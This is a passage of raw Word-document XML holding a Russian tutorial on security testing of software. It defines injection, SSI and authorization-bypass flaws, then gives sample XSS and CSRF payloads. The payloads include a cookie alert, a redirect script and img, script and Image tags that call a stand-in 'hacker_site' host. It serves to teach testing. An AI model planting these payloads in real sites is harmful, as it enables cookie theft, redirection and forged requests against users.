          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SQL, PHP, ASP и т.д.) - это вид уязвимости, при котором становится возможно осуществить запуск исполняемого кода с целью получения доступа к системным ресурсам, несанкционированного доступа к данным либо выведения системы из строя.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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Server-Side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Includes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SSI) </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Injection</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> - это вид уязвимости, использующий вставку серверных команд в HTML код или запуск их напрямую с сервера.</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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Authorization</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Bypass</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> - это вид уязвимости, при котором возможно получить несанкционированный доступ к учетной записи или документам другого пользователя</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
    <w:p w:rsidR="005E2C4B" w:rsidRDefault="005E2C4B"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
    <w:p w:rsidR="005E2C4B" w:rsidRDefault="005E2C4B"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
    <w:p w:rsidR="005E2C4B" w:rsidRDefault="005E2C4B"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p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="005E2C4B"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00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Как тестировать ПО на безопасность?</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Приведем примеры тестирования ПО на предмет уязвимости в системе безопасности. Для этого Вам необходимо проверить Ваше программное обеспечение на наличия известных видов уязвимостей:</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XSS (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Cross-Site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Scripting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Сами по себе XSS атаки могут быть очень разнообразными. Злоумышленники могут попытаться украсть ваши </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>куки</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">, перенаправить вас на сайт, где произойдет более серьезная атака, загрузить в память какой-либо вредоносный объект и т.д., всего </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>навсего</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> разместив вредоносный скрипт у вас на сайте. Как пример, можно рассмотреть следующий скрипт, выводящий на экран ваши </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>куки</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&lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>script&gt;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>alert(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>document.cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>);&lt;/script&gt;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либо </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>скрипт</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> делающий </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>редирект</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> на зараженную страницу:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="708"/>
          <w:tab w:val="left" w:pos="2325"/>
        </w:tabs>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="708"/>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&lt;script&gt;window.parent.location.href='http://hacker_site';&lt;/script&gt;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либо создающий вредоносный объект с вирусом и т.п.:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="708"/>
          <w:tab w:val="left" w:pos="2325"/>
        </w:tabs>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="708"/>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&lt;object type="text/x-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>scriptlet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>" data="http://hacker_site"&gt;&lt;/object&gt;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Для просмотра большего количества примеров рекомендуем посетить страничку: XSS (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Cross</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Site</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Scripting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>)...</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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XSRF / CSRF (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Request</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Forgery</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Наиболее частыми CSRF атаками являются </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>атаки</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> использующие HTML &lt;IMG&gt; тэг или </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Javascript</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> объект </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>image</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>. Чаще всего атакующий добавляет необходимый код в электронное письмо или выкладывает на веб-сайт, таким образом, что при загрузке страницы осуществляется запрос, выполняющий вредоносный код. Примеры:</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IMG</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SRC</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&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>img</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lang w:val="en-US"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>="</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>://</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>hacker</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>site</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>/?</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>command</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"&gt;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SCRIPT</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SRC</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 xml:space="preserve">&lt;script </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>="http://hacker_site/?command"&gt;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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Javascript</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>объект</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Image</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&lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>script</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>&gt;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 xml:space="preserve">           </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> foo = new Image();</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 xml:space="preserve">           </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>foo.src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> = "http://hacker_site/?command";</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&lt;/script&gt;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 xml:space="preserve">Code injections (SQL, PHP, ASP </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>и</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
